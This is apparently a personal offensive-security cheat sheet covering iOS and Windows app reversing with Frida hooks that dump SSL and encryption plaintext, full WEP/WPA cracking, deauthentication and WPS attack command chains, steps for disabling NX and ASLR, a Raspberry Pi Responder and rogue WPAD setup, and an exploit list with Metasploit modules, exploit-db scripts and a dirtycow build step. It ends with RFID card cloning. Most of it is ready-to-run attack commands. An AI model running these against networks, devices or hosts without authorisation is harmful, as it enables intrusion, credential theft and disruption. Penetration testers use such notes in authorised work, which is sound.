objection patchipa --source XXX.ipa --codesign-signature AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -P /Users/xxx/Library/Developer/Xcode/DerivedDa
ta/testt-enhimopwzhxhgebfyooccsfdpihg/Build/Products/Debug-iphoneos/testt.app/embedded.mobileprovision
-----------

-----------View APPs files (sandbox) in debuggable App (iOS)
### Get Xcode 9
https://developer.apple.com/download/more/			--> Xcode 9.4.1 —> iOS 11.4.1
# Get into de device in XCode and find download container
-----------

-----------Security frameworks for APP protection (magic quadrant)
# https://blog.mindedsecurity.com/2018/05/
-----------

-----------Install/export .ipa APPs in iOS
# https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06c-Reverse-Engineering-and-Tampering.md
# first of all install IPA Installer from cydia
# list of installed APPs
ipainstaller -l
# export APP to disk
ipainstaller -b com.example.targetapp -o /tmp/example.ipa
-----------

-----------Anti-instrumentation methods - frida
# https://crackinglandia.wordpress.com/2015/11/10/anti-instrumentation-techniques-i-know-youre-there-frida/
-----------

-----------.app folder to .ipa (iOS)
mkdir Payload
scp -r root@192.168.1.X:/var/containers/Bundle/Application/A55D9AC8-655D-4C09-B0E1-XXXXXXXXXXXX/example.app Payload/
zip -r example.ipa Payload
-----------

-----------View traffic (iOS - no jailbreak)
# https://www.agnosticdev.com/blog-entry/networking-ios/capturing-packet-trace-ios-device
rvictl -s <iOS_identifier_ID>
-----------

-----------Frida enumerate methods/classes (iOS)
# https://github.com/0xdea/frida-scripts
frida -U "Safari" -l raptor_frida_ios_enum.js -e "enumAllMethods()" -q > pepe2
-----------

-----------Keychain dumper + bypass iOS sandbox binary execution
# https://github.com/ptoomey3/Keychain-Dumper
-----------

-----------Intercept SSL library - Frida (iOS)
# Based in: https://github.com/google/ssl_logger
# Working example to intercept SSL traffic cleartext (HTTP/1.X) with libssl/libboringssl
# Patch also SSL_write if needed
# Take a look at this project --> https://github.com/saleemrashid/frida-sslkeylog
import frida
import sys
session = frida.get_usb_device().attach("APPNAME EXAMPLE")
script = session.create_script(
    """
    send("Start injecting...");
    Interceptor.attach(Module.findExportByName(null, "SSL_read"), {
        onEnter: function(args) {
            send(Memory.readCString(ptr(args[1])));
			send(Module.findExportByName(null, "SSL_read"));}
    });""")
def on_message(message, data):
    print(message)
script.on('message', on_message)
script.load()
sys.stdin.read()
-----------

-----------Intercept ObjeC method and get arguments - Frida (iOS)
import frida
import sys
session = frida.get_usb_device().attach("APPNAME EXAMPLE")
script = session.create_script(
    """
    send("Start injecting...");
	var resolver = new ApiResolver('objc');
    var matches = resolver.enumerateMatches('-[PepeController getPepeKey]');
    Interceptor.attach(matches[0]["address"], {
        onEnter: function(args) {
			send(args[0]);
            send(args[1]);
			send(args[2]);
			send(args[3]);
			send(Memory.readCString(ptr(args[0])));
            send(Memory.readCString(ptr(args[1])));
			send(Memory.readCString(ptr(args[2])));
			send(Memory.readCString(ptr(args[3])));
        }
    });""")
def on_message(message, data):
    print(message)
script.on('message', on_message)
script.load()
sys.stdin.read()
-----------

-----------Windows UWP App - dump App at run-time to bypass encryption
# https://github.com/Wunkolo/UWPDumper
-----------

-----------Proxy Windows UWP App
# https://www.thewindowsclub.com/setup-proxy-metro-application-windows-8
# Config IE proxy
Netsh winhttp import proxy source=ie
-----------

-----------Depacking Windows UWP App
XXXX_x86.appxbundle: can be depacked, just unzip it, you'll find XXXX.appx inside.
XXXX.appx: again unpack it via zip. You can find the libraries (.dll) that the application is using (nice for reversing).
XXXX.appxsym: unpack it via zip. You'll get XXXX.WindowsStore.pdb which includes the symbols and stuff (nice for reversing).
-----------

-----------Windows UWP App - installation folder
C:\Users\Marcelo\AppData\Local\Packages
-----------

-----------Script intercept sqlite/bcrypt - Frida (Windows UWP App (Mobile/Desktop))
import frida
import sys
#pid = input("app pid: ")
#session = frida.attach(int(pid))
session = frida.attach("XXXXXXXXX.exe")
script = session.create_script(
    """
    console.log("Start injecting...");
    sqlite3_prepare_v2 = Module.findExportByName('e_sqlite3.dll', 'sqlite3_prepare_v2');
    Interceptor.attach(sqlite3_prepare_v2, {
        onEnter: function(args) {
            //SQL QUERIES
	    	//console.log('SQL prepare: ' + Memory.readUtf8String(args[1]));
        }});
    sqlite3_bind_text = Module.findExportByName('e_sqlite3.dll', 'sqlite3_bind_text');
    Interceptor.attach(sqlite3_bind_text, {
        onEnter: function(args) {
            //SQL VALUES (TEXT)
	    	//console.log('SQL bind(text): ' + Memory.readUtf8String(args[2]));
        }});
    bcrypt_encrypt = Module.findExportByName('bcrypt.dll', 'BCryptEncrypt');
    Interceptor.attach(bcrypt_encrypt, {
        onEnter: function(args) {
      		//DUMP ENCRYPTED STUFF CLEAR TEXT
            //console.log('Bcrypt enc: ' + args[1] + '-->' + Memory.readUtf8String(args[1]));
            try{
            	//console.log(Memory.readUtf8String(args[1]));
            }
            catch(err) {
            }
            //dump = Memory.readByteArray(args[1],1024);
	    	//console.log(hexdump(dump, { offset: 0, length: 1024, header: false, ansi: false }));
    }});     
    bcrypt_encrypt = Module.findExportByName('bcrypt.dll', 'BCryptEncrypt');
    Interceptor.attach(bcrypt_encrypt, {
        onEnter: function(args) {
      		//MODIFY ENCRYPTION TEXT
            //console.log("===Bruteforce Attack")
            //dump = Memory.readByteArray(args[1],1);
	    	//console.log('Previous-->' + hexdump(dump, { offset: 0, length: 1, header: false, ansi: false }));
	    	//dump = Memory.readByteArray(args[1],32);
	    	//console.log(hexdump(dump, { offset: 0, length: 32, header: false, ansi: false }));
	    	//Memory.writeByteArray(ptr(args[1]),[0x39]);
	    	//dump = Memory.readByteArray(args[1],1);
	    	//console.log('Hooked-->' + hexdump(dump, { offset: 0, length: 1, header: false, ansi: false }));
        }});        
    """)
def on_message(message, data):
    print(message)
script.on('message', on_message)
script.load()
sys.stdin.read()
-----------

-----------Route Burp through VPN in iOS device
# https://andreas-kurtz.de/2013/07/ios-proxy-fight/
-----------

-----------Nice guide of iOS Pentest
# https://web.securityinnovation.com/hubfs/iOS%20Hacking%20Guide.pdf
-----------

-----------Analyze HTTP/2 only applications
# https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/testing-http2-only-web-services/
-----------

-----------OWASP MASVS + MSTG
### Mobile Application Security Verification Standard (MASVS):
# https://www.owasp.org/images/6/61/MASVS_v0.9.4.pdf
### Mobile Security Testing Guide (MSTG):
# https://github.com/OWASP/owasp-mstg/releases
# https://github.com/OWASP/owasp-mstg
-----------

-----------Anti reversing defences
# https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md#ios-anti-reversing-defenses
-----------

-----------Frida hooking OjectiveC
# https://www.frida.re/docs/javascript-api/#objc
-----------

-----------Debuggin iOS Apps with IDA pro
# https://www.hex-rays.com/products/ida/support/tutorials/ios_debugger_tutorial.pdf
-----------

-----------Decrypt applications from Appstore
# https://github.com/AloneMonkey/frida-ios-dump
# with jailbroken device and openssh installed, add the ssh credentials to the script
# run the App in the device
python dump.py com.pepe.PepeApp
-----------
=================================><===


=================================>WIFI <===
-----------Restore the firmware - (PIÑATA ROUTER)
Set manual IP 192.168.1.X2
Disconnect
Press the button
Connect
Wait for the 5th blink of the led
Access to 192.168.1.X1
-----------

-----------Default IP - (PIÑATA ROUTER)
http://172.16.42.X1:1471/
-----------

-----------WIFI Checklist
# https://github.com/jshaw87/Cheatsheets/blob/master/Cheatsheet_WirelessTesting.txt
### WEP attack with aircrack-ng suite
airmon-ng start wlan0 <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
aireplay-ng -3 -b <AP MAC> -h <Attacker MAC> wlan0mon # ARP Replay
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> wlan0mon
aircrack-ng -0 <filename.cap>
# 
airmon-ng start wlan0 <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
aireplay-ng -5 -b <AP MAC> -h <Attacker MAC> wlan0mon
packetforge-ng -0 -a <AP MAC> -h <Attacker MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <packet filename>
tcpdump -n -vvv -e -s0 -r <packet filename>
aireplay-ng -2 -r <packet filename> wlan0mon
aircrack-ng -0 <filename>

### WPA PSK attack with aircrack-ng suite.
airmon-ng start wlan0 <AP Channel>
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0mon
aircrack-ng -0 -w <wordlist> <capture file>
# You can capture the handshake passively (it takes time) or de-authenticate a client.

### De-authentication attack
aireplay-ng --deauth 3 -a <BSSID> -c <client_mac> mon0
# Deauth every client - aireplay-ng -0 5 -a <bssid> mon0

### Dictionary Attack
aircrack-ng -w passwords.lst capture-01.cap

### Brute force Attack
crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap

### CoWPAtty Attack
Wordlist mode:
cowpatty -r <Capture file> -f <wordlist> -2 -s <AP ESSID>

### PMK mode:
genpmk -f <wordlist> -d <hash filename> -s <AP ESSID>
cowpatty -r <Capture file> -d <hash filename> -2 -s <AP ESSID>

### Rogue Access Point Testing
ifconfig wlan0 down
iw reg set BO
iwconfig wlan0 txpower 0
ifconfig wlan0 up
airmon-ng start wlan0
airodump-ng --write capture mon0
# 
ifconfig wlan1 down
iw reg set BO
ifconfig wlan1 up
iwconfig wlan1 channel 13
iwconfig wlan1 txpower 30
iwconfig wlan1 rate 11M auto

### Reaver
airmon-ng start wlan0
airodump-ng wlan0
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1

### Pixie WPS
airmon-ng check
airmon-ng start wlan0
airodump-ng wlan0mon --wps
reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1

### Wireless Notes
# Wired Equivalent Privacy (WEP)
RC4 stream cipher w/ CRC32 for integrity check
- Attack: 
By sniffing an ARP packet, then replaying it to get many encrypted replies with different IVs.
- Remediation: 
Use WPA2
# Wifi Protected Access (WPA)
Temporal Key Integrity Protocol (TKIP) Message Integrity Check
- Attack: 
Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
- Remediation: 
Use long-keys
# Wifi Protected Access 2 (WPA2)
Advanced Encryption Standard (AES)
- Attack: 
Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
- Remediation:
WPA-Enterprise
-----------

-----------Wifi Arsenal
# https://github.com/0x90/wifi-arsenal
-----------

=================================><===


=================================>RADARE2 <===
-----------Install radare2 from git
git clone https://github.com/radare/radare2 && cd radare2 && ./sys/install.sh
-----------

-----------Architectures	
rabin2 -I crackme0x00a				--> information of the executable
rabin2 -z crackme0x00a				--> strings visualization
rabin2 -s logmein					--> view symbols
rabin2 -e logmein 					--> view the entrypoint if we can not jump directly to the menu
-----------

-----------Static analysis
g 						--> go to the menu
V 						--> visual mode
:s sym.main 			--> search in the main
:s - 					--> undo
:s + 					--> redo
-----------

-----------Debug mode
radare2 -Ad crackme0x00a
radare2 -Ad crackme0x00a arg		--> arg is the first argument of crackme0x00a
dr 									--> display registers
dr all 								--> display all registers
dr?sf								--> display SF register (for JNS jumps)
pd 10 								--> print 10 bytes
VV									--> graphic mode
V 									--> enter in visual mode
	p 								--> change view mode (third one has the registers on the top)
	s 								--> single step forward (F7)
	S 								--> step over (advance without entering inside of the functions) (F8)
	VV 								--> graph View
	b 								--> breakpoint
	u/U 							--> undo/redo
    v								--> view all the functions and the point of execution
S									--> view sections
S.									--> view actual section
db 0x8048920						--> breakpoint
dbc <addr> <cmd>					--> run command when breakpoint is hit
dc 									--> continue process execution
dm  								--> process map
dmi ntdll~							--> view the functions of the library
db 'dmi ntdll~Compress'				--> make a breakpoint in the direction of the function
do									--> reopen the program
dr eax=33 							--> change register value
drx 0 <address> 4 2					--> hardware breakpoint, stops when it access the address
dx 9090 							--> inject and execute OPCODES (execute code)
dcu 0xf7773105						--> run until direction
dcc 								--> run untill call
dcs 								--> run untill syscall
dcr									--> run untill return
dsf									--> step untill the end of the frame
dbt 								--> display backtrace (it checks the frames from the stack, maybe useful to know where do you come from)
p8 10 @ 0x8048920					--> get 10 bytes of the value (usually for the stack) (p8, p16, p32, p64 ; print byte, word, dword, qword list)
ps @ str.PasswordOK					--> view content in ascii
!!rax2 0x242b0500					--> hex to decimal
!!rax2 -e 0x242b0500 				--> hex to decimal changin endianess
!!rax2 -s 0x242b0500 				--> hex to ascii
!rasm2 -a x86 -d 4883ec30			--> translate codes to instructions
s esp								--> seek the stack
s main								--> seek the main
so -1								--> seek backwards
:/x 45435345  						--> search opcodes
:/c jmp								--> search code
f									--> view flags
drd									--> view the registers that changed since the last step (useful for CMP, TEST)
dro									--> view previous registers
;									--> insert comment
oo									--> reopen program
/m									--> look for magic bytes
iz									--> show strings only in data section
izz									--> show all strings
ii									--> show imports
;									--> comment
? 0xbb8								--> 3000 0xbb8 05670 2.9K 0000:0bb8 3000 10111000 3000.0 0.000000f 0.000000
afll								--> view the functions (and how many time they were called)
axt 0x004633a2						--> where a function was called
afn functionname newname			--> rename function
afvn varname newname				--> rename variable
/									--> highlight
-----------

-----------Assemble-disassemble x86/x64
# https://defuse.ca/online-x86-assembler.htm#disassembly2
-----------

-----------Writing mode
radare2 -Aw crackme0x00a
s 0x08048531						--> search the address
wx 7421								--> modify the content of the pointed address
wx 123456 @ 0x8048300				--> modify the content of the address
wa push ebp 						--> write in assembly
-----------

-----------x86 instructions
http://ref.x86asm.net/coder32.html
-----------

-----------Assembler instructions
<inst> <dst>, <src>				--> Intel
<inst> <src>, <dst>				--> AT&T
mov rdx, qword [rbp - 0x38]					--> stores a variable, to view it: pf S @ rbp - 0x38
test eax, eax								--> it checks if the EAX register is  < 0, if it's true SF=1
jmp 0x40082b								--> unconditional jump
ja 0x40082b									--> if the previous cmp A>B then jump
jns 0x8048491								--> JNS (Jump on No Sign), if SF = 0 the program will jump to (0x08048491), else continues.
mov dword [esp], str.g00dJ0B 				--> pointer of esp = direction(str.G00dJOB)
lea rax, qword [rbp-local_4]				--> load Efective Address, it's like MOVE but it moves the address not the content
call 0x108048384 ; (sym.imp.strlen) 		--> the parameters are sent to the stack, the result is returned in the EAX register.
-----------

-----------Crackme resolution
https://asciinema.org/a/83o8b4fntta8k2r7betizbz2j			--> crackme0x00a
https://asciinema.org/a/178g3pzeubxng2dc4g0eoq82f			--> crackme0x01
https://asciinema.org/a/5grhhy2r0i5tm1id1arwkargv			--> crackme0x02
-----------

-----------Writing payloads
perl -e 'print "A" x 20;'
perl -e 'print "\x41" x 20;'
perl -e 'print "A"x20 . "BCD"
./overflow_example $(perl -e 'print "A"x30')
-----------

-----------General purpose registers
XXXXXXXXXXXXXXXX --> RAX
________XXXXXXXX --> EAX
____________XXXX --> AX
____________XX__ --> AH
______________XX --> AL

EAX 	--> Accumulator
ECX 	--> Counter
EDX 	--> Data
EBX 	--> Base

ESP 	--> Sack Pointer
EBP 	--> Base Pointer
ESI 	--> Source Index
EDI 	--> Destination Index
EIP 	--> Instruction Pointer

Syscall:
EAX			--> return value
EDI			--> arg0
ESI			--> arg1
EDX			--> arg2
r10-r8-r9	--> arg3-arg5

Function calls:
EAX			--> return value
EDI			--> arg0
ESI			--> arg1
EDX			--> arg2
ECX-r8-r9	--> arg3-arg5
-----------

-----------Data types
1 byte --> 8 bits
1 word --> 16 bits
1 dword --> 32 bits		(double word)
1 qword --> 64 bits		(quad word)
1 dqword --> 128 bits	(double quad word)
-----------

-----------Functions
# https://youtu.be/LAkYW5ixvhg?t=39m17s
### Prolog
push rbp
mov rbp, rsp
sub rsp, 0x20
### Epilog
# leave:
mov rsp, rbp
pop rbp
# ret:
pop rip
-----------

-----------Memory Segmentation (in order)
TEXT	--> where the assembler machine instructions are (write permission disabled) (fixed size)
DATA	--> initialized global and static variables (writable) (fixed size)
BSS		--> non initialized variables (writable) (fixed size)
HEAP	--> a programmer can reserve this memory on the fly. Malloc, pointers (writable) (variable size)
STACK	--> to store variables and functions temporally. LIFO nature PUSH-POP (writable) (variable size)
-----------

-----------Smooth lines :)
e scr.utf8 =  true
-----------

-----------Z3 is your friend
# Come on lazy, write it.
# https://www.securityartwork.es/2017/06/06/rompiendo-verificaciones-clave-theorem-provers/
-----------

-----------Z3 example resolution equation system
from z3 import *

def solve_check():
  l = []
  for i in xrange(0, 8):
    # Add unknown 
    l.append(BitVec(i, 8))

  s = Solver()
  for i in xrange(0, 33):
    # add ASCII-printability constraints
    s.add(l[i] >= 0x20, l[i] <= 0x7E)

  # Add check constraints
  s.add(59013 * l[20] + 56285 * l[4] + -27448 * l[0] - 58587 * l[8] - 59507 * l[12] - 11572 * l[16] - 4903 * l[24] - 10792 * l[28] - 7699 * l[32] == -4484598)
  s.add(22699 * l[28] + 57665 * l[24] + 34008 * l[8] + 43285 * l[0] - 44357 * l[4] - 4342 * l[12] - 11572 * l[16] - 21720 * l[20] - 46513 * l[32] == 3610183)

  # Check if problem is satisfiable before trying to solve it
  if(s.check() == sat):
    print "[+] Problem is SAT :) solving..."
    # Now solve it
    sol_model = s.model()
    
    # Convert solution to string
    sol = ""
    for i in xrange(0, 33):
      sol += chr(sol_model[l[i]].as_long())
    return sol
  else:
    return False

print "[*] Setting up SAT constraints..."
flag = solve_check()
if (flag):
  print "[+] Got flag: [%s]" % flag
-----------

-----------Angr for symbolic execution
# https://p1kachu.pluggi.fr/writeup/re/2016/05/23/defconquals-baby-re-writeup/
-----------

-----------Compiling .asm (assembler) to bin
nasm sourcecode.asm -f bin -o file.bin
-----------

-----------Unpacking (malware) examples (r2con)
# First: writing in memory (loky example)
Look for kernel32 -> VirtualAlloc
--> Commands aproximation:
dmi kernell32~VirtualAlloc
db 'dmi ntdll~RtlCompressBuffer'
dcr
ds
drx 0 EAX 4 2				--> set a hardware breakpoint in the return
# Second: compression (dridex example)
Decompress with ntdll -> RtlCompressBuffer
--> Commands aproximation:
dmi ntdll~RtlCompressBuffer			--> view the functions of the library
db 'dmi ntdll~RtlCompressBuffer'	--> make a breakpoint in the direction of the function
ESP+8				--> get the arguments, the address point and the size
-----------

-----------AVR reversing (r2con)
avr-objcopy -I ihex -O binary hello.hex hello.bin
radare2 -a avr hello.bin
-----------
=================================><===


=================================>REVERSE ENGINEERING - EXPLOITING <===
-----------Exploiting anti-exploiting protections :)
### Canary
Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. 
When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore 
alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.
Stack canaries work by modifying every function's prologue and epilogue regions to place and check a value on the stack respectively. 
As such, if a stack buffer is overwritten during a memory copy operation, the error is noticed before execution returns from the copy function. 
When this happens, an exception is raised, which is passed back up the exception handler hierarchy until it finally hits the OS's default exception handler. 
If you can overwrite an existing exception handler structure in the stack, you can make it point to your own code. 
This is a Structured Exception Handling (SEH) exploit, and it allows you to completely skip the canary check.

### DEP / NX (Data Execution Prevention / No-eXecute)
DEP and NX essentially mark important structures in memory as non-executable, and force hardware-level exceptions if you try to execute those memory regions. 
This makes normal stack buffer overflows where you set eip to esp+offset and immediately run your shellcode impossible, because the stack is non-executable. 
Bypassing DEP and NX requires a cool trick called Return-Oriented Programming (ROP).

### ROP (Return-Oriented Programming)
Essentially involves finding existing snippets of code from the program (called gadgets) and jumping to them, such that you produce a desired outcome. 
Since the code is part of legitimate executable memory, DEP and NX don't matter. These gadgets are chained together via the stack, which contains your exploit payload. 
Each entry in the stack corresponds to the address of the next ROP gadget. 
Each gadget is in the form of instr1; instr2; instr3; ... instrN; ret, so that the ret will jump to the next address on the stack after executing the instructions, 
thus chaining the gadgets together. Often additional values have to be placed on the stack in order to successfully complete a chain, 
due to instructions that would otherwise get in the way.
The trick is to chain these ROPs together in order to call a memory protection function such as VirtualProtect, which is then used to make the stack executable, 
so your shellcode can run, via an jmp esp or equivalent gadget. Tools like mona.py can be used to generate these ROP gadget chains, or find ROP gadgets in general.

### ASLR (Address Space Layout Randomisation)
There are a few ways to bypass ASLR:
Direct RET overwrite - Often processes with ASLR will still load non-ASLR modules, allowing you to just run your shellcode via a jmp esp.
Partial EIP overwrite - Only overwrite part of EIP, or use a reliable information disclosure in the stack to find what the real EIP should be, then use it to calculate your target. 
We still need a non-ASLR module for this though.
NOP spray - Create a big block of NOPs to increase chance of jump landing on legit memory. Difficult, but possible even when all modules are ASLR-enabled. 
Won't work if DEP is switched on though.
Bruteforce - If you can try an exploit with a vulnerability that doesn't make the program crash, you can bruteforce 256 different target addresses until it works.
-----------

-----------Disable buffer overflow protections - NX (Linux)
# Disable Non-Executable Stack (NX)
# https://gist.github.com/joswr1ght/a45d000ceaccf4cce6cb
ESC 						--> access ubuntu grub
E							--> edit
noexec=off noexec32=off		--> Edit the boot configuration and add to the "linux" line
dmesg | grep NX				--> to check if it's enabled/disabled
# For permanent changes:
sudo vim /etc/default/grub
noexec=off noexec32=off		--> add to GRUB_CMDLINE_LINUX_DEFAULT
sudo update-grub
# It's also possible to disable it in the copiler (there is more protection on Ubuntu 16.4 cause I can only run it on 14.4)
gcc -m32 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 -o pepe pepe.c
-----------

-----------Disable buffer overflow protections - ASLR (Linux)
# Disable Adress Space Layout Randomization (ASLR)
# http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space				--> Disable
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space				--> Enable
# For permanent changes:
echo "kernel.randomize_va_space = 0" | sudo tee -a /etc/sysctl.conf
-----------

-----------Disable stack protections from compiler
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
-----------

-----------Exploiting Resources
# https://github.com/FabioBaroni/awesome-exploit-development
-----------

-----------Fuzzing Resources
# https://github.com/secfigo/Awesome-Fuzzing
-----------

-----------Reversing Resources
# https://github.com/fdivrp/awesome-reversing
-----------

-----------Injectos list
# https://github.com/rootm0s/Injectors
-----------

-----------Reversing list of resources
# https://github.com/wtsxDev/reverse-engineering
-----------

-----------Reversing .NET
# https://www.red-gate.com/products/dotnet-development/reflector/index
# https://www.jetbrains.com/decompiler/
-----------

-----------IDA Pro interesting plugins
### Findcrypt:
# https://github.com/you0708/ida/tree/master/idapython_tools/findcrypt
# File -> Script file... -> findcrypt.py
### BinDiff:
# https://www.zynamics.com/software.html
# https://www.youtube.com/watch?v=UWvYv6ZckM8
-----------
=================================><===


=================================>RASPBERRY PI ZERO - RESPONDER ATTACK <===
-----------Ignore interfices for network-manager ubuntu (it's also possible for MACs)
sudo vim /etc/NetworkManager/NetworkManager.conf
# Add:
	[keyfile]
	unmanaged-devices=interface-name:usb0
-----------

-----------Static IP (maybe network-manager tries to reconfigure it every time)
sudo vim /etc/network/interfaces
	auto usb0
	iface usb0 inet static
    	address 192.168.2.X202
      	netmask 255.255.255.X0
        gateway 192.168.2.X1
-----------

-----------View iptables in detail
sudo iptables -nvL -t nat
-----------

-----------Flush all iptables
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X	
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
-----------

-----------Raspberry Pi Zero internet (NAT private networks)
Raspberry PI:
	sudo route del default 
  	sudo ip route add default via 192.168.2.X202 dev usb0
    echo "nameserver 8.8.8.X8" >> /etc/resolv.conf
Host Machine:
	echo 1 > /proc/sys/net/ipv4/ip_forward
	sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    sudo iptables -A FORWARD -o eth0 -i usb0 -s 192.168.2.X0/24 -j ACCEPT
-----------

-----------Install DHCP server -  Raspberry Pi Zero
sudo apt-get install isc-dhcp-server
-----------

-----------Configure DHCP server - Raspberry Pi Zero
# Edit /etc/dhcp/dhcpd.conf and replace the contents with the text below:
ddns-update-style none;  
option domain-name "domain.local";  
option domain-name-servers 192.168.2.X201;  
default-lease-time 60;  
max-lease-time 72;  
# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;  
# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;  
# wpad
option local-proxy-config code 252 = text;  
# A slightly different configuration for an internal subnet.
subnet 192.168.2.X0 netmask 255.255.255.X0 {  
range 192.168.2.X1 192.168.2.X2;  
option routers 192.168.2.X201;  
option local-proxy-config "http://192.168.2.X201/wpad.dat";  
}
-----------

-----------Install Responder - Raspberry Pi Zero
sudo pip install pycrypto  
sudo su  
cd ~/  
git clone https://github.com/spiderlabs/responder 
-----------

=================================><===


=================================>EXPLOITS <===
-----------New list
MS08-067	--> OK RCE		(Windows 2000, XP, 2003)			use exploit/windows/smb/ms08_067_netapi
MS05-043	--> OK RCE		(Windows 2000, XP, 2003)			use eexploit/windows/smb/ms05_039_pnp			(reboot risk)
MS06-040	--> OK RCE		(Windows 2000, XP, 2003)			use exploit/windows/smb/ms06_040_netapi			(reboot risk)
MS17-010	--> OK RCE  	(Windows 7 to Windows Server 2012)	Eternalblue
CVE-2019-5736 --> RCE		Docker								https://www.exploit-db.com/exploits/46369
-----------

-----------Vendors
auxiliary/scanner/ssh/juniper_backdoor			--> juniper
-----------

-----------MS08-067 - without metasploit
nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 X.X.X.X
searchsploit ms08-067
python /usr/share/exploitdb/platforms/windows/remote/7132.py X.X.X.X 1
-----------

-----------Privilege Escalation
CVE-2016-6664 / CVE-2016-5617 (LW) ->  MySQL 	<= 5.5.51 <= 5.6.32 <= 5.7.14 - Root Privilege Escalation	--> https://www.exploit-db.com/exploits/40679/
CVE-2016-0728 (L)	Linux Kernel 4.4, Android 4.0-6.01 	--> It needs keyutils developers libraries --> https://www.exploit-db.com/exploits/15609/
CVE-2010-4398 (W)	XP,Vista,7,Server 2003/2008 		--> https://www.exploit-db.com/exploits/15609/
CVE-2016-5195 (L)	--> 	Linux Kernel 2.6.22 < 3.9	--> https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679	
					--> hay que seleccionar la arquitectura
					--> gcc cowroot.c -o cowroot -pthread
					--> echo 0 > /proc/sys/vm/dirty_writeback_centisecs		--> execute this as root to avoid freezing the system
CVE-2017-0213 (L)	Windows 7, 10						--> http://seclist.us/windows-com-elevation-of-privilege-vulnerability-cve-2017-0213.html
-----------

-----------Privilege Escalation Linux Systems
# https://github.com/jshaw87/Cheatsheets/blob/master/Cheatsheet_LinuxPrivilegeEsc.txt
-----------

-----------Auto-root bash script - Linux
# http://seclist.us/auto-root-exploit-is-a-bash-script-for-auto-root-exploits-tool.html
-----------

-----------Linux Kernel exploits - privilege escalation
https://www.kernel-exploits.com/
-----------

-----------Other exploits
MS05-027	-->
MS05-047	--> DOS
MS06-035	--> DOS checker
MS06-040	--> FAIL  
MS09-001	--> DOS
MS12-020	--> DOS checker
MS14-066	--> DOS
MS15-034	--> DOS


Port(623)  UDP Port (IBM)	--> use auxiliary/scanner/ipmi/ipmi_dumphashes
Port(2381) HP Managment 	--> use exploit/multi/http/hp_sys_mgmt_exec
Port(5555) HP Protector 	--> use auxiliary/admin/hp/data-prot3			(maybe it doesent work with the metasploit preloaded version)
Port(1527) Oracle DDBB 		--> an odat module tnspoison to make a mitm and view ddbb password, etc. (CVE-2012-1675) https://github.com/quentinhardy/odat/wiki/tnspoison

-----------

-----------IIS 6.0 Windows Server 2003 R2
https://www.exploit-db.com/exploits/41992/
-----------

-----------Search exploit exploit-db local Kali
searchsploit apache2 remote
-----------

-----------Search exploit (by port) exploit-db local kali
port="5555";grep -Ril $port /usr/share/exploitdb/platforms/ | while read line; do printf "\e[0;32m==========="$line"\x1b[m\n"; cat $line|grep $port --color; done
-----------

-----------Encrypt web exploits
# http://www.kitploit.com/2017/10/ironsquirrel-encrypted-exploit-delivery.html
-----------

-----------Total Meltdown - Privilege Escalation (CVE-2018-1038)
# http://www.hackplayers.com/2018/04/exploit-total-meltdown-privesc.html
-----------

-----------Winrar RCE PoC - CVE-2018-20250 (gracias @Marcos)
# https://research.checkpoint.com/extracting-code-execution-from-winrar
# https://github.com/WyAtu/CVE-2018-20250
-----------
=================================><===


=================================>RFID <===
-----------First steps ChamaleonMini
Kali Virual Machine
apt-get install avrdude
(Press RBTN before connecting it)
sudo avrdude -c flip2 -p ATXMega128A4U -B 60 -P usb -U application:w:Chameleon-Mini.hex:i -U eeprom:w:Chameleon-Mini.eep:i
sudo python3 chamtool.py -v -p /dev/ttyACM0 -c ISO14443A_READER
minicom -D /dev/ttyACM0
Commands 	--> http://rawgit.com/emsec/ChameleonMini/master/Doc/Doxygen/html/Page_CommandLine.html
-----------

-----------ChamaleonMini - upload/download card content (windows)
Install windows drivers for ChamaleonMini --> https://github.com/emsec/ChameleonMini/tree/master/Drivers
Install TeraTerm --> https://osdn.net/projects/ttssh2/releases/
Apply the confs of --> https://store.ryscc.com/blogs/news/39859649-emulating-mifare-4k-tags-with-the-chameleonmini
UPLOAD/DOWNLOAD command from the term
File -> Transfere -> XMODEM -> Receive/Send
-----------

-----------Upload tag to chamaleon mini
git clone https://github.com/emsec/ChameleonMini
cd ChameleonMini/Software
python3 chamtool.py -p /dev/ttyACM0 -u /media/MifareClassic1K_m.mfd
